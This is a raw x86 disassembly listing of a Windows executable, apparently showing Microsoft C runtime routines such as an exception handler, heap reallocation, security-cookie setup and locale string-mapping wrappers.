  4271f5:	lea    eax,[edx+0x4]
  4271f8:	pop    edi
  4271f9:	pop    esi
  4271fa:	pop    ebx
  4271fb:	leave  
  4271fc:	ret    
  4271fd:	int3   
  4271fe:	int3   
  4271ff:	int3   
  427200:	push   esi
  427201:	inc    ebx
  427202:	xor    dh,BYTE PTR [eax]
  427204:	pop    eax
  427205:	inc    ebx
  427206:	xor    BYTE PTR [eax],dh
  427208:	push   ebp
  427209:	mov    ebp,esp
  42720b:	sub    esp,0x8
  42720e:	push   ebx
  42720f:	push   esi
  427210:	push   edi
  427211:	push   ebp
  427212:	cld    
  427213:	mov    ebx,DWORD PTR [ebp+0xc]
  427216:	mov    eax,DWORD PTR [ebp+0x8]
  427219:	test   DWORD PTR [eax+0x4],0x6
  427220:	jne    0x4272a8
  427226:	mov    DWORD PTR [ebp-0x8],eax
  427229:	mov    eax,DWORD PTR [ebp+0x10]
  42722c:	mov    DWORD PTR [ebp-0x4],eax
  42722f:	lea    eax,[ebp-0x8]
  427232:	mov    DWORD PTR [ebx-0x4],eax
  427235:	mov    esi,DWORD PTR [ebx+0xc]
  427238:	mov    edi,DWORD PTR [ebx+0x8]
  42723b:	cmp    esi,0xffffffff
  42723e:	je     0x4272a1
  427240:	lea    ecx,[esi+esi*2]
  427243:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  427248:	je     0x42728f
  42724a:	push   esi
  42724b:	push   ebp
  42724c:	lea    ebp,[ebx+0x10]
  42724f:	call   DWORD PTR [edi+ecx*4+0x4]
  427253:	pop    ebp
  427254:	pop    esi
  427255:	mov    ebx,DWORD PTR [ebp+0xc]
  427258:	or     eax,eax
  42725a:	je     0x42728f
  42725c:	js     0x42729a
  42725e:	mov    edi,DWORD PTR [ebx+0x8]
  427261:	push   ebx
  427262:	call   0x428190
  427267:	add    esp,0x4
  42726a:	lea    ebp,[ebx+0x10]
  42726d:	push   esi
  42726e:	push   ebx
  42726f:	call   0x4281d2
  427274:	add    esp,0x8
  427277:	lea    ecx,[esi+esi*2]
  42727a:	push   0x1
  42727c:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  427280:	call   0x428266
  427285:	mov    eax,DWORD PTR [edi+ecx*4]
  427288:	mov    DWORD PTR [ebx+0xc],eax
  42728b:	call   DWORD PTR [edi+ecx*4+0x8]
  42728f:	mov    edi,DWORD PTR [ebx+0x8]
  427292:	lea    ecx,[esi+esi*2]
  427295:	mov    esi,DWORD PTR [edi+ecx*4]
  427298:	jmp    0x42723b
  42729a:	mov    eax,0x0
  42729f:	jmp    0x4272bd
  4272a1:	mov    eax,0x1
  4272a6:	jmp    0x4272bd
  4272a8:	push   ebp
  4272a9:	lea    ebp,[ebx+0x10]
  4272ac:	push   0xffffffff
  4272ae:	push   ebx
  4272af:	call   0x4281d2
  4272b4:	add    esp,0x8
  4272b7:	pop    ebp
  4272b8:	mov    eax,0x1
  4272bd:	pop    ebp
  4272be:	pop    edi
  4272bf:	pop    esi
  4272c0:	pop    ebx
  4272c1:	mov    esp,ebp
  4272c3:	pop    ebp
  4272c4:	ret    
  4272c5:	push   ebp
  4272c6:	mov    ecx,DWORD PTR [esp+0x8]
  4272ca:	mov    ebp,DWORD PTR [ecx]
  4272cc:	mov    eax,DWORD PTR [ecx+0x1c]
  4272cf:	push   eax
  4272d0:	mov    eax,DWORD PTR [ecx+0x18]
  4272d3:	push   eax
  4272d4:	call   0x4281d2
  4272d9:	add    esp,0x8
  4272dc:	pop    ebp
  4272dd:	ret    0x4
  4272e0:	call   0x4251f3
  4272e5:	add    eax,0x8
  4272e8:	ret    
  4272e9:	push   0x14
  4272eb:	push   0x429878
  4272f0:	call   0x425340
  4272f5:	mov    edi,DWORD PTR [ebp+0x8]
  4272f8:	xor    ebx,ebx
  4272fa:	cmp    edi,ebx
  4272fc:	jne    0x42730c
  4272fe:	push   DWORD PTR [ebp+0xc]
  427301:	call   0x426062
  427306:	pop    ecx
  427307:	jmp    0x427490
  42730c:	mov    esi,DWORD PTR [ebp+0xc]
  42730f:	cmp    esi,ebx
  427311:	jne    0x42731f
  427313:	push   edi
  427314:	call   0x425f4a
  427319:	pop    ecx
  42731a:	jmp    0x42748e
  42731f:	cmp    DWORD PTR ds:0x45e144,0x3
  427326:	jne    0x42745a
  42732c:	mov    DWORD PTR [ebp-0x1c],ebx
  42732f:	cmp    esi,0xffffffe0
  427332:	ja     0x427429
  427338:	push   0x4
  42733a:	call   0x4254ff
  42733f:	pop    ecx
  427340:	mov    DWORD PTR [ebp-0x4],ebx
  427343:	push   edi
  427344:	call   0x426722
  427349:	pop    ecx
  42734a:	mov    DWORD PTR [ebp-0x20],eax
  42734d:	cmp    eax,ebx
  42734f:	je     0x4273f9
  427355:	cmp    esi,DWORD PTR ds:0x45df04
  42735b:	ja     0x4273a9
  42735d:	push   esi
  42735e:	push   edi
  42735f:	push   eax
  427360:	call   0x426c22
  427365:	add    esp,0xc
  427368:	test   eax,eax
  42736a:	je     0x427371
  42736c:	mov    DWORD PTR [ebp-0x1c],edi
  42736f:	jmp    0x4273a9
  427371:	push   esi
  427372:	call   0x426f01
  427377:	pop    ecx
  427378:	mov    DWORD PTR [ebp-0x1c],eax
  42737b:	cmp    eax,ebx
  42737d:	je     0x4273a9
  42737f:	mov    eax,DWORD PTR [edi-0x4]
  427382:	dec    eax
  427383:	mov    DWORD PTR [ebp-0x24],eax
  427386:	cmp    eax,esi
  427388:	jb     0x42738c
  42738a:	mov    eax,esi
  42738c:	push   eax
  42738d:	push   edi
  42738e:	push   DWORD PTR [ebp-0x1c]
  427391:	call   0x426080
  427396:	push   edi
  427397:	call   0x426722
  42739c:	mov    DWORD PTR [ebp-0x20],eax
  42739f:	push   edi
  4273a0:	push   eax
  4273a1:	call   0x42674d
  4273a6:	add    esp,0x18
  4273a9:	cmp    DWORD PTR [ebp-0x1c],ebx
  4273ac:	jne    0x4273f9
  4273ae:	cmp    esi,ebx
  4273b0:	jne    0x4273b8
  4273b2:	xor    esi,esi
  4273b4:	inc    esi
  4273b5:	mov    DWORD PTR [ebp+0xc],esi
  4273b8:	add    esi,0xf
  4273bb:	and    esi,0xfffffff0
  4273be:	mov    DWORD PTR [ebp+0xc],esi
  4273c1:	push   esi
  4273c2:	push   ebx
  4273c3:	push   DWORD PTR ds:0x45e140
  4273c9:	call   DWORD PTR ds:0x429030
  4273cf:	mov    DWORD PTR [ebp-0x1c],eax
  4273d2:	cmp    eax,ebx
  4273d4:	je     0x4273f9
  4273d6:	mov    eax,DWORD PTR [edi-0x4]
  4273d9:	dec    eax
  4273da:	mov    DWORD PTR [ebp-0x24],eax
  4273dd:	cmp    eax,esi
  4273df:	jb     0x4273e3
  4273e1:	mov    eax,esi
  4273e3:	push   eax
  4273e4:	push   edi
  4273e5:	push   DWORD PTR [ebp-0x1c]
  4273e8:	call   0x426080
  4273ed:	push   edi
  4273ee:	push   DWORD PTR [ebp-0x20]
  4273f1:	call   0x42674d
  4273f6:	add    esp,0x14
  4273f9:	or     DWORD PTR [ebp-0x4],0xffffffff
  4273fd:	call   0x427451
  427402:	cmp    DWORD PTR [ebp-0x20],ebx
  427405:	jne    0x427429
  427407:	cmp    esi,ebx
  427409:	jne    0x42740e
  42740b:	xor    esi,esi
  42740d:	inc    esi
  42740e:	add    esi,0xf
  427411:	and    esi,0xfffffff0
  427414:	mov    DWORD PTR [ebp+0xc],esi
  427417:	push   esi
  427418:	push   edi
  427419:	push   ebx
  42741a:	push   DWORD PTR ds:0x45e140
  427420:	call   DWORD PTR ds:0x4290d0
  427426:	mov    DWORD PTR [ebp-0x1c],eax
  427429:	mov    eax,DWORD PTR [ebp-0x1c]
  42742c:	cmp    eax,ebx
  42742e:	jne    0x427490
  427430:	cmp    DWORD PTR ds:0x45ddc8,ebx
  427436:	je     0x427490
  427438:	push   esi
  427439:	call   0x427c22
  42743e:	pop    ecx
  42743f:	test   eax,eax
  427441:	jne    0x42732c
  427447:	jmp    0x42748e
  427449:	xor    ebx,ebx
  42744b:	mov    esi,DWORD PTR [ebp+0xc]
  42744e:	mov    edi,DWORD PTR [ebp+0x8]
  427451:	push   0x4
  427453:	call   0x42546b
  427458:	pop    ecx
  427459:	ret    
  42745a:	xor    eax,eax
  42745c:	cmp    esi,0xffffffe0
  42745f:	ja     0x427477
  427461:	cmp    esi,ebx
  427463:	jne    0x427468
  427465:	xor    esi,esi
  427467:	inc    esi
  427468:	push   esi
  427469:	push   edi
  42746a:	push   ebx
  42746b:	push   DWORD PTR ds:0x45e140
  427471:	call   DWORD PTR ds:0x4290d0
  427477:	cmp    eax,ebx
  427479:	jne    0x427490
  42747b:	cmp    DWORD PTR ds:0x45ddc8,ebx
  427481:	je     0x427490
  427483:	push   esi
  427484:	call   0x427c22
  427489:	pop    ecx
  42748a:	test   eax,eax
  42748c:	jne    0x42745a
  42748e:	xor    eax,eax
  427490:	call   0x42537b
  427495:	ret    
  427496:	push   0x10
  427498:	push   0x429888
  42749d:	call   0x425340
  4274a2:	cmp    DWORD PTR ds:0x45e144,0x3
  4274a9:	jne    0x4274e5
  4274ab:	push   0x4
  4274ad:	call   0x4254ff
  4274b2:	pop    ecx
  4274b3:	and    DWORD PTR [ebp-0x4],0x0
  4274b7:	mov    esi,DWORD PTR [ebp+0x8]
  4274ba:	push   esi
  4274bb:	call   0x426722
  4274c0:	pop    ecx
  4274c1:	mov    DWORD PTR [ebp-0x1c],eax
  4274c4:	test   eax,eax
  4274c6:	je     0x4274d3
  4274c8:	mov    esi,DWORD PTR [esi-0x4]
  4274cb:	sub    esi,0x9
  4274ce:	mov    DWORD PTR [ebp-0x20],esi
  4274d1:	jmp    0x4274d6
  4274d3:	mov    esi,DWORD PTR [ebp-0x20]
  4274d6:	or     DWORD PTR [ebp-0x4],0xffffffff
  4274da:	call   0x427503
  4274df:	cmp    DWORD PTR [ebp-0x1c],0x0
  4274e3:	jne    0x4274f8
  4274e5:	push   DWORD PTR [ebp+0x8]
  4274e8:	push   0x0
  4274ea:	push   DWORD PTR ds:0x45e140
  4274f0:	call   DWORD PTR ds:0x4290d4
  4274f6:	mov    esi,eax
  4274f8:	mov    eax,esi
  4274fa:	call   0x42537b
  4274ff:	ret    
  427500:	mov    esi,DWORD PTR [ebp-0x20]
  427503:	push   0x4
  427505:	call   0x42546b
  42750a:	pop    ecx
  42750b:	ret    
  42750c:	push   ebp
  42750d:	mov    ebp,esp
  42750f:	sub    esp,0x10
  427512:	push   esi
  427513:	lea    eax,[ebp-0x8]
  427516:	push   eax
  427517:	call   DWORD PTR ds:0x4290e4
  42751d:	mov    esi,DWORD PTR [ebp-0x4]
  427520:	xor    esi,DWORD PTR [ebp-0x8]
  427523:	call   DWORD PTR ds:0x4290e0
  427529:	xor    esi,eax
  42752b:	call   DWORD PTR ds:0x429098
  427531:	xor    esi,eax
  427533:	call   DWORD PTR ds:0x4290dc
  427539:	xor    esi,eax
  42753b:	lea    eax,[ebp-0x10]
  42753e:	push   eax
  42753f:	call   DWORD PTR ds:0x4290d8
  427545:	mov    eax,DWORD PTR [ebp-0xc]
  427548:	xor    eax,DWORD PTR [ebp-0x10]
  42754b:	xor    esi,eax
  42754d:	mov    DWORD PTR ds:0x45d430,esi
  427553:	jne    0x42755f
  427555:	mov    DWORD PTR ds:0x45d430,0xbb40e64e
  42755f:	pop    esi
  427560:	leave  
  427561:	ret    
  427562:	push   0x118
  427567:	push   0x429a38
  42756c:	call   0x425340
  427571:	mov    eax,ds:0x45d430
  427576:	xor    eax,DWORD PTR [ebp+0x4]
  427579:	mov    DWORD PTR [ebp-0x1c],eax
  42757c:	mov    eax,ds:0x45dd98
  427581:	xor    ecx,ecx
  427583:	cmp    eax,ecx
  427585:	je     0x4275a6
  427587:	mov    DWORD PTR [ebp-0x4],ecx
  42758a:	push   DWORD PTR [ebp+0xc]
  42758d:	push   DWORD PTR [ebp+0x8]
  427590:	call   eax
  427592:	pop    ecx
  427593:	pop    ecx
  427594:	or     DWORD PTR [ebp-0x4],0xffffffff
  427598:	jmp    0x4276a4
  42759d:	xor    eax,eax
  42759f:	inc    eax
  4275a0:	ret    
  4275a1:	mov    esp,DWORD PTR [ebp-0x18]
  4275a4:	jmp    0x427594
  4275a6:	mov    eax,DWORD PTR [ebp+0x8]
  4275a9:	dec    eax
  4275aa:	je     0x4275bf
  4275ac:	mov    edi,0x429a14
  4275b1:	mov    DWORD PTR [ebp-0x20],0x429960
  4275b8:	mov    esi,0xd4
  4275bd:	jmp    0x4275d0
  4275bf:	mov    edi,0x429940
  4275c4:	mov    DWORD PTR [ebp-0x20],0x4298a0
  4275cb:	mov    esi,0xb9
  4275d0:	mov    BYTE PTR [ebp-0x24],cl
  4275d3:	push   0x104
  4275d8:	lea    eax,[ebp-0x128]
  4275de:	push   eax
  4275df:	push   ecx
  4275e0:	call   DWORD PTR ds:0x429068
  4275e6:	test   eax,eax
  4275e8:	jne    0x4275fd
  4275ea:	push   0x429594
  4275ef:	lea    eax,[ebp-0x128]
  4275f5:	push   eax
  4275f6:	call   0x425720
  4275fb:	pop    ecx
  4275fc:	pop    ecx
  4275fd:	lea    ebx,[ebp-0x128]
  427603:	lea    eax,[ebp-0x128]
  427609:	push   eax
  42760a:	call   0x425950
  42760f:	pop    ecx
  427610:	add    eax,0xb
  427613:	cmp    eax,0x3c
  427616:	jbe    0x427641
  427618:	lea    eax,[ebp-0x128]
  42761e:	push   eax
  42761f:	call   0x425950
  427624:	mov    ebx,eax
  427626:	lea    eax,[ebp-0x128]
  42762c:	sub    eax,0x31
  42762f:	add    ebx,eax
  427631:	push   0x3
  427633:	push   0x429590
  427638:	push   ebx
  427639:	call   0x425820
  42763e:	add    esp,0x10
  427641:	push   ebx
  427642:	call   0x425950
  427647:	pop    ecx
  427648:	lea    eax,[eax+esi*1+0xc]
  42764c:	add    eax,0x3
  42764f:	and    eax,0xfffffffc
  427652:	call   0x425390
  427657:	mov    DWORD PTR [ebp-0x18],esp
  42765a:	mov    esi,esp
  42765c:	push   edi
  42765d:	push   esi
  42765e:	call   0x425720
  427663:	mov    edi,0x429570
  427668:	push   edi
  427669:	push   esi
  42766a:	call   0x425730
  42766f:	push   0x429894
  427674:	push   esi
  427675:	call   0x425730
  42767a:	push   ebx
  42767b:	push   esi
  42767c:	call   0x425730
  427681:	push   edi
  427682:	push   esi
  427683:	call   0x425730
  427688:	push   DWORD PTR [ebp-0x20]
  42768b:	push   esi
  42768c:	call   0x425730
  427691:	push   0x12010
  427696:	push   0x429548
  42769b:	push   esi
  42769c:	call   0x425622
  4276a1:	add    esp,0x3c
  4276a4:	push   0x3
  4276a6:	call   0x4247ac
  4276ab:	int3   
  4276ac:	push   0x38
  4276ae:	push   0x429e58
  4276b3:	call   0x425340
  4276b8:	xor    ebx,ebx
  4276ba:	cmp    DWORD PTR ds:0x45ddbc,ebx
  4276c0:	jne    0x4276fa
  4276c2:	push   ebx
  4276c3:	push   ebx
  4276c4:	xor    esi,esi
  4276c6:	inc    esi
  4276c7:	push   esi
  4276c8:	push   0x429e54
  4276cd:	push   0x100
  4276d2:	push   ebx
  4276d3:	call   DWORD PTR ds:0x4290f0
  4276d9:	test   eax,eax
  4276db:	je     0x4276e5
  4276dd:	mov    DWORD PTR ds:0x45ddbc,esi
  4276e3:	jmp    0x4276fa
  4276e5:	call   DWORD PTR ds:0x429044
  4276eb:	cmp    eax,0x78
  4276ee:	jne    0x4276fa
  4276f0:	mov    DWORD PTR ds:0x45ddbc,0x2
  4276fa:	cmp    DWORD PTR [ebp+0x14],ebx
  4276fd:	jle    0x42771a
  4276ff:	mov    ecx,DWORD PTR [ebp+0x14]
  427702:	mov    eax,DWORD PTR [ebp+0x10]
  427705:	dec    ecx
  427706:	cmp    BYTE PTR [eax],bl
  427708:	je     0x427712
  42770a:	inc    eax
  42770b:	cmp    ecx,ebx
  42770d:	jne    0x427705
  42770f:	or     ecx,0xffffffff
  427712:	or     eax,0xffffffff
  427715:	sub    eax,ecx
  427717:	add    DWORD PTR [ebp+0x14],eax
  42771a:	mov    eax,ds:0x45ddbc
  42771f:	cmp    eax,0x2
  427722:	je     0x427904
  427728:	cmp    eax,ebx
  42772a:	je     0x427904
  427730:	cmp    eax,0x1
  427733:	jne    0x427937
  427739:	xor    edi,edi
  42773b:	mov    DWORD PTR [ebp-0x1c],edi
  42773e:	mov    DWORD PTR [ebp-0x20],ebx
  427741:	mov    DWORD PTR [ebp-0x24],ebx
  427744:	cmp    DWORD PTR [ebp+0x20],ebx
  427747:	jne    0x427751
  427749:	mov    eax,ds:0x45ddb4
  42774e:	mov    DWORD PTR [ebp+0x20],eax
  427751:	push   ebx
  427752:	push   ebx
  427753:	push   DWORD PTR [ebp+0x14]
  427756:	push   DWORD PTR [ebp+0x10]
  427759:	xor    eax,eax
  42775b:	cmp    DWORD PTR [ebp+0x24],ebx
  42775e:	setne  al
  427761:	lea    eax,[eax*8+0x1]
  427768:	push   eax
  427769:	push   DWORD PTR [ebp+0x20]
  42776c:	call   DWORD PTR ds:0x4290ec
  427772:	mov    esi,eax
  427774:	mov    DWORD PTR [ebp-0x28],esi
  427777:	cmp    esi,ebx
  427779:	je     0x427937
  42777f:	mov    DWORD PTR [ebp-0x4],0x1
  427786:	lea    eax,[esi+esi*1]
  427789:	add    eax,0x3
  42778c:	and    eax,0xfffffffc
  42778f:	call   0x425390
  427794:	mov    DWORD PTR [ebp-0x18],esp
  427797:	mov    eax,esp
  427799:	mov    DWORD PTR [ebp-0x2c],eax
  42779c:	or     DWORD PTR [ebp-0x4],0xffffffff
  4277a0:	jmp    0x4277bd
  4277a2:	xor    eax,eax
  4277a4:	inc    eax
  4277a5:	ret    
  4277a6:	mov    esp,DWORD PTR [ebp-0x18]
  4277a9:	call   0x4287d5
  4277ae:	xor    ebx,ebx
  4277b0:	mov    DWORD PTR [ebp-0x2c],ebx
  4277b3:	or     DWORD PTR [ebp-0x4],0xffffffff
  4277b7:	mov    edi,DWORD PTR [ebp-0x1c]
  4277ba:	mov    esi,DWORD PTR [ebp-0x28]
  4277bd:	cmp    DWORD PTR [ebp-0x2c],ebx
  4277c0:	jne    0x4277de
  4277c2:	lea    eax,[esi+esi*1]
  4277c5:	push   eax
  4277c6:	call   0x426062
  4277cb:	pop    ecx
  4277cc:	mov    DWORD PTR [ebp-0x2c],eax
  4277cf:	cmp    eax,ebx
  4277d1:	je     0x427937
  4277d7:	mov    DWORD PTR [ebp-0x20],0x1
  4277de:	push   esi
  4277df:	push   DWORD PTR [ebp-0x2c]
  4277e2:	push   DWORD PTR [ebp+0x14]
  4277e5:	push   DWORD PTR [ebp+0x10]
  4277e8:	push   0x1
  4277ea:	push   DWORD PTR [ebp+0x20]
  4277ed:	call   DWORD PTR ds:0x4290ec
  4277f3:	test   eax,eax
  4277f5:	je     0x4278e1
  4277fb:	push   ebx
  4277fc:	push   ebx
  4277fd:	push   esi
  4277fe:	push   DWORD PTR [ebp-0x2c]
  427801:	push   DWORD PTR [ebp+0xc]
  427804:	push   DWORD PTR [ebp+0x8]
  427807:	call   DWORD PTR ds:0x4290f0
  42780d:	mov    edi,eax
  42780f:	mov    DWORD PTR [ebp-0x1c],edi
  427812:	cmp    edi,ebx
  427814:	je     0x4278e1
  42781a:	test   BYTE PTR [ebp+0xd],0x4
  42781e:	je     0x42784d
  427820:	cmp    DWORD PTR [ebp+0x1c],ebx
  427823:	je     0x4278e1
  427829:	cmp    edi,DWORD PTR [ebp+0x1c]
  42782c:	jg     0x4278e1
  427832:	push   DWORD PTR [ebp+0x1c]
  427835:	push   DWORD PTR [ebp+0x18]
  427838:	push   esi
  427839:	push   DWORD PTR [ebp-0x2c]
  42783c:	push   DWORD PTR [ebp+0xc]
  42783f:	push   DWORD PTR [ebp+0x8]
  427842:	call   DWORD PTR ds:0x4290f0
  427848:	jmp    0x4278e1
  42784d:	mov    DWORD PTR [ebp-0x4],0x2
  427854:	lea    eax,[edi+edi*1]
  427857:	add    eax,0x3
  42785a:	and    eax,0xfffffffc
  42785d:	call   0x425390
  427862:	mov    DWORD PTR [ebp-0x18],esp
  427865:	mov    eax,esp
  427867:	mov    DWORD PTR [ebp-0x30],eax
  42786a:	or     DWORD PTR [ebp-0x4],0xffffffff
  42786e:	jmp    0x42788b
  427870:	xor    eax,eax
  427872:	inc    eax
  427873:	ret    
  427874:	mov    esp,DWORD PTR [ebp-0x18]
  427877:	call   0x4287d5
  42787c:	xor    ebx,ebx
  42787e:	mov    DWORD PTR [ebp-0x30],ebx
  427881:	or     DWORD PTR [ebp-0x4],0xffffffff
  427885:	mov    edi,DWORD PTR [ebp-0x1c]
  427888:	mov    esi,DWORD PTR [ebp-0x28]
  42788b:	cmp    DWORD PTR [ebp-0x30],ebx
  42788e:	jne    0x4278a8
  427890:	lea    eax,[edi+edi*1]
  427893:	push   eax
  427894:	call   0x426062
  427899:	pop    ecx
  42789a:	mov    DWORD PTR [ebp-0x30],eax
  42789d:	cmp    eax,ebx
  42789f:	je     0x4278e1
  4278a1:	mov    DWORD PTR [ebp-0x24],0x1
  4278a8:	push   edi
  4278a9:	push   DWORD PTR [ebp-0x30]
  4278ac:	push   esi
  4278ad:	push   DWORD PTR [ebp-0x2c]
  4278b0:	push   DWORD PTR [ebp+0xc]
  4278b3:	push   DWORD PTR [ebp+0x8]
  4278b6:	call   DWORD PTR ds:0x4290f0
  4278bc:	test   eax,eax
  4278be:	je     0x4278e1
  4278c0:	push   ebx
  4278c1:	push   ebx
  4278c2:	cmp    DWORD PTR [ebp+0x1c],ebx
  4278c5:	jne    0x4278cb
  4278c7:	push   ebx
  4278c8:	push   ebx
  4278c9:	jmp    0x4278d1
  4278cb:	push   DWORD PTR [ebp+0x1c]
  4278ce:	push   DWORD PTR [ebp+0x18]
  4278d1:	push   edi
  4278d2:	push   DWORD PTR [ebp-0x30]
  4278d5:	push   ebx
  4278d6:	push   DWORD PTR [ebp+0x20]
  4278d9:	call   DWORD PTR ds:0x42907c
  4278df:	mov    edi,eax
  4278e1:	cmp    DWORD PTR [ebp-0x24],ebx
  4278e4:	je     0x4278ef
  4278e6:	push   DWORD PTR [ebp-0x30]
  4278e9:	call   0x425f4a
  4278ee:	pop    ecx
  4278ef:	cmp    DWORD PTR [ebp-0x20],ebx
  4278f2:	je     0x4278fd
  4278f4:	push   DWORD PTR [ebp-0x2c]
  4278f7:	call   0x425f4a
  4278fc:	pop    ecx
  4278fd:	mov    eax,edi
  4278ff:	jmp    0x427a5f
  427904:	mov    DWORD PTR [ebp-0x34],ebx
  427907:	xor    edi,edi
  427909:	mov    DWORD PTR [ebp-0x38],ebx
  42790c:	cmp    DWORD PTR [ebp+0x8],ebx
  42790f:	jne    0x427919
  427911:	mov    eax,ds:0x45dda4
  427916:	mov    DWORD PTR [ebp+0x8],eax
  427919:	cmp    DWORD PTR [ebp+0x20],ebx
  42791c:	jne    0x427926
  42791e:	mov    eax,ds:0x45ddb4
  427923:	mov    DWORD PTR [ebp+0x20],eax
  427926:	push   DWORD PTR [ebp+0x8]
  427929:	call   0x4285bd
  42792e:	pop    ecx
  42792f:	mov    DWORD PTR [ebp-0x3c],eax
  427932:	cmp    eax,0xffffffff
  427935:	jne    0x42793e
  427937:	xor    eax,eax
  427939:	jmp    0x427a5f
  42793e:	cmp    eax,DWORD PTR [ebp+0x20]
  427941:	je     0x427a35
  427947:	push   ebx
  427948:	push   ebx
  427949:	lea    ecx,[ebp+0x14]
  42794c:	push   ecx
  42794d:	push   DWORD PTR [ebp+0x10]
  427950:	push   eax
  427951:	push   DWORD PTR [ebp+0x20]
  427954:	call   0x428606
  427959:	add    esp,0x18
  42795c:	mov    DWORD PTR [ebp-0x34],eax
  42795f:	cmp    eax,ebx
  427961:	je     0x427937
  427963:	push   ebx
  427964:	push   ebx
  427965:	push   DWORD PTR [ebp+0x14]
  427968:	push   eax
  427969:	push   DWORD PTR [ebp+0xc]
  42796c:	push   DWORD PTR [ebp+0x8]
  42796f:	call   DWORD PTR ds:0x4290e8
  427975:	mov    esi,eax
  427977:	mov    DWORD PTR [ebp-0x40],esi
  42797a:	cmp    esi,ebx
  42797c:	je     0x427a24
  427982:	mov    DWORD PTR [ebp-0x4],ebx
  427985:	add    eax,0x3
  427988:	and    eax,0xfffffffc
  42798b:	call   0x425390
  427990:	mov    DWORD PTR [ebp-0x18],esp
  427993:	mov    edi,esp
  427995:	mov    DWORD PTR [ebp-0x44],edi
  427998:	push   esi
  427999:	push   ebx
  42799a:	push   edi
  42799b:	call   0x427c40
  4279a0:	add    esp,0xc
  4279a3:	jmp    0x4279b5
  4279a5:	xor    eax,eax
  4279a7:	inc    eax
  4279a8:	ret    
  4279a9:	mov    esp,DWORD PTR [ebp-0x18]
  4279ac:	call   0x4287d5
  4279b1:	xor    ebx,ebx
  4279b3:	xor    edi,edi
  4279b5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4279b9:	cmp    edi,ebx
  4279bb:	jne    0x4279e0
  4279bd:	push   DWORD PTR [ebp-0x40]
  4279c0:	call   0x426062
  4279c5:	pop    ecx
  4279c6:	mov    edi,eax
  4279c8:	cmp    edi,ebx
  4279ca:	je     0x4279fd
  4279cc:	push   DWORD PTR [ebp-0x40]
  4279cf:	push   ebx
  4279d0:	push   edi
  4279d1:	call   0x427c40
  4279d6:	add    esp,0xc
  4279d9:	mov    DWORD PTR [ebp-0x38],0x1
  4279e0:	push   DWORD PTR [ebp-0x40]
  4279e3:	push   edi
  4279e4:	push   DWORD PTR [ebp+0x14]
  4279e7:	push   DWORD PTR [ebp-0x34]
  4279ea:	push   DWORD PTR [ebp+0xc]
  4279ed:	push   DWORD PTR [ebp+0x8]
  4279f0:	call   DWORD PTR ds:0x4290e8
  4279f6:	mov    DWORD PTR [ebp-0x40],eax
  4279f9:	cmp    eax,ebx
  4279fb:	jne    0x427a01
  4279fd:	xor    esi,esi
  4279ff:	jmp    0x427a27
  427a01:	push   DWORD PTR [ebp+0x1c]
  427a04:	push   DWORD PTR [ebp+0x18]
  427a07:	lea    eax,[ebp-0x40]
  427a0a:	push   eax
  427a0b:	push   edi
  427a0c:	push   DWORD PTR [ebp+0x20]
  427a0f:	push   DWORD PTR [ebp-0x3c]
  427a12:	call   0x428606
  427a17:	add    esp,0x18
  427a1a:	mov    esi,eax
  427a1c:	neg    esi
  427a1e:	sbb    esi,esi
  427a20:	neg    esi
  427a22:	jmp    0x427a27
  427a24:	mov    esi,DWORD PTR [ebp-0x48]
  427a27:	cmp    DWORD PTR [ebp-0x38],ebx
  427a2a:	je     0x427a4f
  427a2c:	push   edi
  427a2d:	call   0x425f4a
  427a32:	pop    ecx
  427a33:	jmp    0x427a4f
  427a35:	push   DWORD PTR [ebp+0x1c]
  427a38:	push   DWORD PTR [ebp+0x18]
  427a3b:	push   DWORD PTR [ebp+0x14]
  427a3e:	push   DWORD PTR [ebp+0x10]
  427a41:	push   DWORD PTR [ebp+0xc]
  427a44:	push   DWORD PTR [ebp+0x8]
  427a47:	call   DWORD PTR ds:0x4290e8
  427a4d:	mov    esi,eax
  427a4f:	cmp    DWORD PTR [ebp-0x34],ebx
  427a52:	je     0x427a5d
  427a54:	push   DWORD PTR [ebp-0x34]
  427a57:	call   0x425f4a
  427a5c:	pop    ecx
  427a5d:	mov    eax,esi
  427a5f:	lea    esp,[ebp-0x54]
  427a62:	call   0x42537b
  427a67:	ret    
  427a68:	push   0x1c
  427a6a:	push   0x429e80
  427a6f:	call   0x425340
  427a74:	xor    esi,esi
  427a76:	cmp    DWORD PTR ds:0x45ddc0,esi
  427a7c:	jne    0x427ab3
  427a7e:	lea    eax,[ebp-0x1c]
  427a81:	push   eax
  427a82:	xor    edi,edi
  427a84:	inc    edi
  427a85:	push   edi
  427a86:	push   0x429e54
  427a8b:	push   edi
  427a8c:	call   DWORD PTR ds:0x4290f8
  427a92:	test   eax,eax
  427a94:	je     0x427a9e
  427a96:	mov    DWORD PTR ds:0x45ddc0,edi
  427a9c:	jmp    0x427ab3
  427a9e:	call   DWORD PTR ds:0x429044
  427aa4:	cmp    eax,0x78
  427aa7:	jne    0x427ab3
  427aa9:	mov    DWORD PTR ds:0x45ddc0,0x2
  427ab3:	mov    eax,ds:0x45ddc0
  427ab8:	cmp    eax,0x2
  427abb:	je     0x427bab
  427ac1:	cmp    eax,esi
  427ac3:	je     0x427bab
  427ac9:	cmp    eax,0x1
  427acc:	jne    0x427bd1
  427ad2:	mov    DWORD PTR [ebp-0x20],esi
  427ad5:	mov    DWORD PTR [ebp-0x24],esi
  427ad8:	cmp    DWORD PTR [ebp+0x18],esi
  427adb:	jne    0x427ae5
  427add:	mov    eax,ds:0x45ddb4
  427ae2:	mov    DWORD PTR [ebp+0x18],eax
  427ae5:	push   esi
  427ae6:	push   esi
  427ae7:	push   DWORD PTR [ebp+0x10]
  427aea:	push   DWORD PTR [ebp+0xc]
  427aed:	xor    eax,eax
  427aef:	cmp    DWORD PTR [ebp+0x20],esi
  427af2:	setne  al
  427af5:	lea    eax,[eax*8+0x1]
  427afc:	push   eax
  427afd:	push   DWORD PTR [ebp+0x18]
  427b00:	call   DWORD PTR ds:0x4290ec
  427b06:	mov    edi,eax
  427b08:	mov    DWORD PTR [ebp-0x28],edi
  427b0b:	test   edi,edi
  427b0d:	je     0x427bd1
  427b13:	and    DWORD PTR [ebp-0x4],0x0
  427b17:	lea    ebx,[edi+edi*1]
  427b1a:	mov    eax,ebx
  427b1c:	add    eax,0x3
  427b1f:	and    eax,0xfffffffc
  427b22:	call   0x425390
  427b27:	mov    DWORD PTR [ebp-0x18],esp
  427b2a:	mov    esi,esp
  427b2c:	mov    DWORD PTR [ebp-0x2c],esi
  427b2f:	push   ebx
  427b30:	push   0x0
  427b32:	push   esi
